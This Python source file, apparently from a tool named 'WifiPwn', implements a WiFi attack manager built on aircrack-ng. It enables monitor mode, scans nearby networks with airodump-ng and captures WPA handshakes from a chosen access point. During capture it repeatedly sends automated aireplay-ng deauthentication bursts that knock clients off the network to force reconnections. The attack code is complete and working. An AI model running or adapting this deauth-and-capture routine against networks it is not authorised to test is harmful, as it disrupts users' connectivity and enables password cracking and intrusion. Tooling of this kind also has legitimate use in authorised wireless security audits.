#!/usr/bin/env python3
"""
WifiPwn - WiFi Manager (sin PyQt5)
"""

import os
import re
import subprocess
import threading
import time
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

from core.utils import run_command, kill_process, get_wireless_interfaces, get_interface_info


class WiFiManager:
    """Gestiona interfaces WiFi, escaneo, captura y deauth."""

    _instance: Optional["WiFiManager"] = None
    _init_lock = threading.Lock()

    def __new__(cls):
        if cls._instance is None:
            with cls._init_lock:
                if cls._instance is None:
                    inst = super().__new__(cls)
                    inst._initialized = False
                    cls._instance = inst
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self.current_interface:  Optional[str] = None
        self.monitor_interface:  Optional[str] = None
        self._scan_process:      Optional[subprocess.Popen] = None
        self._capture_process:   Optional[subprocess.Popen] = None
        self._deauth_process:    Optional[subprocess.Popen] = None
        self._scanning  = False
        self._capturing = False
        self._networks:  List[Dict] = []
        self._log_cbs:   List[Callable] = []
        self._scan_cbs:  List[Callable] = []
        self._hs_cbs:    List[Callable] = []  # permanent global callbacks (registered at startup)
        self._capture_cb: Optional[Callable] = None  # per-capture callback (reset each session)
        self._initialized = True

    # ------------------------------------------------------------------
    # Callbacks
    # ------------------------------------------------------------------

    def on_log(self, cb: Callable):        self._log_cbs.append(cb)
    def on_scan_update(self, cb: Callable):  self._scan_cbs.append(cb)
    def on_handshake(self, cb: Callable):    self._hs_cbs.append(cb)

    def _log(self, msg: str):
        for cb in self._log_cbs:
            try: cb(msg)
            except Exception: pass

    def _emit_scan(self, networks: List[Dict]):
        for cb in self._scan_cbs:
            try: cb(networks)
            except Exception: pass

    def _emit_handshake(self, bssid: str):
        # Global permanent callbacks (registered at startup)
        for cb in self._hs_cbs:
            try: cb(bssid)
            except Exception: pass
        # Per-capture callback (set each session, cleared on stop)
        if self._capture_cb:
            try: self._capture_cb(bssid)
            except Exception: pass

    # ------------------------------------------------------------------
    # Interface management
    # ------------------------------------------------------------------

    def get_interfaces(self) -> List[Dict]:
        return get_wireless_interfaces()

    def get_interface_info(self, iface: str) -> Dict:
        return get_interface_info(iface)

    def is_monitor_mode(self, iface: str) -> bool:
        info = get_interface_info(iface)
        return info.get("mode", "").lower() == "monitor"

    def enable_monitor_mode(self, iface: str) -> Tuple[bool, str]:
        self._log(f"Activando modo monitor en {iface}...")
        run_command(["airmon-ng", "check", "kill"])
        rc, stdout, stderr = run_command(["airmon-ng", "start", iface])
        if rc == 0:
            # ── Detect actual monitor interface name ──────────────────
            mon = None

            # 1. airmon-ng renamed it: "enabled on [wlan0mon]" or "enabled on wlan0mon"
            for line in stdout.split("\n"):
                if "monitor mode" in line.lower() and "enabled" in line.lower():
                    m = re.search(r"on \[?([\w]+)\]?", line)
                    if m and m.group(1) != iface:
                        mon = m.group(1)
                        break

            # 2. RTL8821CU / WEXT drivers keep the same interface name in monitor mode
            if not mon:
                info = get_interface_info(iface)
                if info.get("mode", "").lower() == "monitor":
                    mon = iface

            # 3. Check if a <iface>mon variant appeared (some nl80211 drivers)
            if not mon:
                all_ifaces = get_wireless_interfaces()
                candidate = f"{iface}mon"
                if any(i["name"] == candidate for i in all_ifaces):
                    mon = candidate

            # 4. Last resort — assume it kept the original name
            if not mon:
                mon = iface

            self.monitor_interface = mon
            self.current_interface = iface
            self._log(f"Modo monitor activo: {mon}")
            return True, f"Modo monitor activado en: {mon}"
        err = (stderr.strip() or stdout.strip() or "Error al activar modo monitor")
        self._log(err)
        return False, err

    def disable_monitor_mode(self, iface: str = None) -> Tuple[bool, str]:
        iface = iface or self.monitor_interface or self.current_interface
        if not iface:
            return False, "No hay interfaz seleccionada"
        rc, stdout, stderr = run_command(["airmon-ng", "stop", iface])
        if rc == 0:
            self.monitor_interface = None
            self._log("Modo monitor desactivado")
            return True, "Modo monitor desactivado"
        return False, f"Error: {stderr}"

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------

    def start_scan(self, iface: str = None, on_update: Callable = None) -> bool:
        if self._scanning:
            return False
        iface = iface or self.monitor_interface
        if not iface:
            return False

        self._scanning = True
        self._networks = []
        if on_update:
            self._scan_cbs.append(on_update)

        tmp = Path("/tmp/wifipwn_scan")
        tmp.mkdir(exist_ok=True)

        # Remove ALL old CSV files so airodump-ng always writes to scan-01.csv
        for stale in tmp.glob("scan*.csv"):
            try:
                stale.unlink()
            except Exception:
                pass

        prefix = str(tmp / "scan")
        csv_file = prefix + "-01.csv"

        try:
            self._scan_process = subprocess.Popen(
                ["airodump-ng", "--write-interval", "1", "--write", prefix,
                 "--output-format", "csv", iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                text=True,
            )
            self._log(f"airodump-ng iniciado en {iface} (pid={self._scan_process.pid})")
            t = threading.Thread(
                target=self._scan_loop,
                args=(csv_file,),
                daemon=True,
            )
            t.start()
            return True
        except Exception as e:
            self._scanning = False
            self._log(f"Error iniciando airodump-ng: {e}")
            return False

    def _scan_loop(self, csv_file: str):
        from core.utils import parse_airodump_csv

        # Wait up to 12s for the CSV to appear (airodump latency)
        for _ in range(12):
            if not self._scanning:
                return
            if self._scan_process and self._scan_process.poll() is not None:
                # Process already dead — capture stderr for diagnostics
                try:
                    err = self._scan_process.stderr.read(2000)
                    if err:
                        self._log(f"airodump-ng stderr: {err.strip()}")
                except Exception:
                    pass
                self._log("airodump-ng terminó antes de crear el CSV — comprueba el modo monitor")
                self._scanning = False
                return
            if os.path.exists(csv_file):
                break
            time.sleep(1)

        if not os.path.exists(csv_file):
            # Try sibling files in case airodump chose a different suffix
            from pathlib import Path as _P
            candidates = sorted(_P(csv_file).parent.glob("scan*.csv"), key=lambda f: f.stat().st_mtime, reverse=True)
            if candidates:
                csv_file = str(candidates[0])
                self._log(f"Usando CSV alternativo: {csv_file}")
            else:
                self._log(f"No se generó el CSV de escaneo — verifica que {csv_file.split('/')[-2]} tenga permisos")
                self._scanning = False
                return

        while self._scanning:
            if self._scan_process and self._scan_process.poll() is not None:
                try:
                    err = self._scan_process.stderr.read(2000)
                    if err:
                        self._log(f"airodump-ng: {err.strip()}")
                except Exception:
                    pass
                self._log("airodump-ng se cerró inesperadamente")
                self._scanning = False
                break
            try:
                aps, _ = parse_airodump_csv(csv_file)
                self._networks = aps
                if aps:
                    self._emit_scan(aps)
            except Exception as e:
                self._log(f"Error parseando CSV: {e}")
            time.sleep(2)

    def stop_scan(self) -> bool:
        self._scanning = False
        if self._scan_process:
            kill_process(self._scan_process)
            self._scan_process = None
        self._log("Escaneo detenido")
        return True

    def get_networks(self) -> List[Dict]:
        return list(self._networks)

    # ------------------------------------------------------------------
    # Handshake capture
    # ------------------------------------------------------------------

    def start_capture(self, bssid: str, channel: int,
                      output_prefix: str, iface: str = None,
                      on_handshake: Callable = None) -> bool:
        if self._capturing:
            return False
        iface = iface or self.monitor_interface
        if not iface:
            return False

        self._capturing = True
        # Replace per-capture callback (avoids list growing across sessions)
        self._capture_cb = on_handshake

        # Ensure captures directory exists
        cap_dir = os.path.dirname(output_prefix)
        if cap_dir:
            os.makedirs(cap_dir, exist_ok=True)

        # Remove stale capture files with this prefix to force airodump to use -01
        import glob
        for f in glob.glob(output_prefix + "*"):
            try:
                os.remove(f)
            except OSError:
                pass

        try:
            self._capture_process = subprocess.Popen(
                ["airodump-ng", "--channel", str(channel), "--bssid", bssid,
                 "--write", output_prefix, "--output-format", "pcap", iface],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            # Stream airodump stderr in background for diagnostics
            threading.Thread(
                target=self._stream_capture_stderr,
                daemon=True,
            ).start()
            threading.Thread(
                target=self._monitor_handshake,
                args=(output_prefix, bssid),
                daemon=True,
            ).start()
            self._log(f"Captura iniciada: {bssid} canal {channel}")
            return True
        except Exception as e:
            self._capturing = False
            self._log(f"Error captura: {e}")
            return False

    def _stream_capture_stderr(self):
        """Read airodump-ng stderr and log it so the user sees progress."""
        proc = self._capture_process
        if not proc or not proc.stderr:
            return
        try:
            for line in proc.stderr:
                line = line.strip()
                if line and self._capturing:
                    self._log(f"[airodump] {line}")
        except Exception:
            pass

    def _find_cap_file(self, prefix: str) -> Optional[str]:
        """Find the actual .cap file created by airodump (handles -01,-02... suffixes)."""
        import glob
        candidates = sorted(glob.glob(prefix + "*.cap"))
        return candidates[-1] if candidates else None

    def _monitor_handshake(self, output_prefix: str, bssid: str):
        from core.utils import check_handshake_in_cap
        checks = 0
        auto_deauths = 0
        max_auto_deauths = 10
        deauth_every = 15  # every 15 × 2s = 30s

        # Give airodump-ng 3 seconds to start and lock the channel, then send initial deauth
        time.sleep(3)
        if self._capturing and self.monitor_interface:
            self.send_deauth(bssid, None, 1, self.monitor_interface)
            self._log(f"[auto-deauth] Inicial → {bssid} (1 paquete)")

        while self._capturing and checks < 300:
            time.sleep(2)
            checks += 1

            # Periodic deauth every ~30 s to force fresh reconnections
            if checks % deauth_every == 0 and auto_deauths < max_auto_deauths and self.monitor_interface:
                self.send_deauth(bssid, None, 1, self.monitor_interface)
                auto_deauths += 1
                self._log(f"[auto-deauth] #{auto_deauths} → {bssid}")

            cap = self._find_cap_file(output_prefix)
            if cap:
                found, msg = check_handshake_in_cap(cap, bssid)
                if found:
                    self._emit_handshake(bssid)
                    self._log(f"HANDSHAKE detectado: {bssid} ({cap}) — {msg}")
                    return
        if self._capturing:
            self._log("Timeout: no se capturó handshake tras 10 min")

    def stop_capture(self) -> bool:
        self._capturing = False
        self._capture_cb = None
        if self._capture_process:
            kill_process(self._capture_process)
            self._capture_process = None
        self._log("Captura detenida")
        return True

    # ------------------------------------------------------------------
    # Deauth
    # ------------------------------------------------------------------

    def send_deauth(self, bssid: str, client: str = None,
                    packets: int = 5, iface: str = None) -> bool:
        iface = iface or self.monitor_interface
        if not iface:
            return False
        # Kill any running deauth first
        if self._deauth_process and self._deauth_process.poll() is None:
            kill_process(self._deauth_process)
        cmd = ["aireplay-ng", "-0", str(packets), "-a", bssid]
        if client:
            cmd.extend(["-c", client])
        cmd.append(iface)
        try:
            self._deauth_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            target = client or "broadcast"
            self._log(f"Deauth: {packets} paquetes → {target}")
            return True
        except Exception as e:
            self._log(f"Error deauth: {e}")
            return False

    def stop_deauth(self) -> bool:
        if self._deauth_process:
            kill_process(self._deauth_process)
            self._deauth_process = None
            self._log("Deauth detenido")
        return True

    # ------------------------------------------------------------------
    # Misc
    # ------------------------------------------------------------------

    def get_current_interface(self) -> Optional[str]:
        return self.monitor_interface or self.current_interface

    def cleanup(self):
        self.stop_scan()
        self.stop_capture()
        self.stop_deauth()
        if self.monitor_interface:
            self.disable_monitor_mode()


wifi_manager = WiFiManager()
